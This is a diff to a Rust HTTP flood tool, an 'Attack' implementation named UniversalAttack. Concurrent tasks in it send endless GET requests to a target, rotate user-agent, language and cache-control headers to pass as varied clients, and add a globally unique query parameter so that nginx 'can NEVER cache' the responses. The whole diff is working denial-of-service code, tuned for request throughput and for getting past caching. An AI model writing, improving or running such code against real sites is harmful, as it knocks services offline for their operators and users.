@@ -10,6 +10,9 @@
 
 use std::sync::Arc;
 use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
+
+// Global monotonic counter — each request gets a truly unique URL forever
+static REQ_COUNTER: AtomicU64 = AtomicU64::new(0);
 use std::time::{Duration, Instant};
 
 use reqwest::Client;
@@ -177,36 +180,28 @@ impl Attack for UniversalAttack {
                             let mode    = mode.clone();
 
                             tasks.push(tokio::spawn(async move {
-                                // Pre-generate pool of 512 (url, ua, lang, cc) combos
-                                // Zero per-request allocation — just cycle through pool
-                                const POOL: usize = 512;
+                                // Per-task PRNG for header rotation (UA, lang, cc)
                                 let mut rng: u64 = std::time::SystemTime::now()
                                     .duration_since(std::time::UNIX_EPOCH)
                                     .unwrap_or_default()
                                     .as_nanos() as u64;
-                                // Unique per task using task counter via rng offset
                                 rng ^= rng.wrapping_mul(0x9e3779b97f4a7c15).wrapping_add(0xdeadbeef);
-                                xorshift(&mut rng); xorshift(&mut rng); // warm up
+                                xorshift(&mut rng); xorshift(&mut rng);
 
-                                let pool: Vec<(String, &'static str, &'static str, &'static str)> = (0..POOL).map(|_| {
+                                while !stop_c.load(Ordering::Relaxed) {
+                                    // Globally unique counter — NEVER repeats, nginx can NEVER cache
+                                    let n    = REQ_COUNTER.fetch_add(1, Ordering::Relaxed);
                                     let ua   = *rand_pick(USER_AGENTS,    &mut rng);
                                     let lang = *rand_pick(ACCEPT_LANGS,   &mut rng);
                                     let cc   = *rand_pick(CACHE_CONTROLS, &mut rng);
-                                    let bust = rand_hex(&mut rng, 8);
-                                    let url  = format!("{}?v={}", target, bust);
-                                    (url, ua, lang, cc)
-                                }).collect();
-                                let mut idx = 0usize;
-
-                                while !stop_c.load(Ordering::Relaxed) {
-                                    let (url, ua, lang, cc) = &pool[idx % POOL];
-                                    idx = idx.wrapping_add(1);
+                                    // format! with integer is extremely fast (stack-optimized)
+                                    let url  = format!("{}?v={:x}", target, n);
 
                                     let t0 = Instant::now();
-                                    match client.get(url.as_str())
-                                        .header("user-agent",      *ua)
-                                        .header("accept-language", *lang)
-                                        .header("cache-control",   *cc)
+                                    match client.get(&url)
+                                        .header("user-agent",      ua)
+                                        .header("accept-language", lang)
+                                        .header("cache-control",   cc)
                                         .header("pragma",          "no-cache")
                                         .header("accept",          "text/html,application/xhtml+xml,*/*;q=0.8")
                                         .send().await {
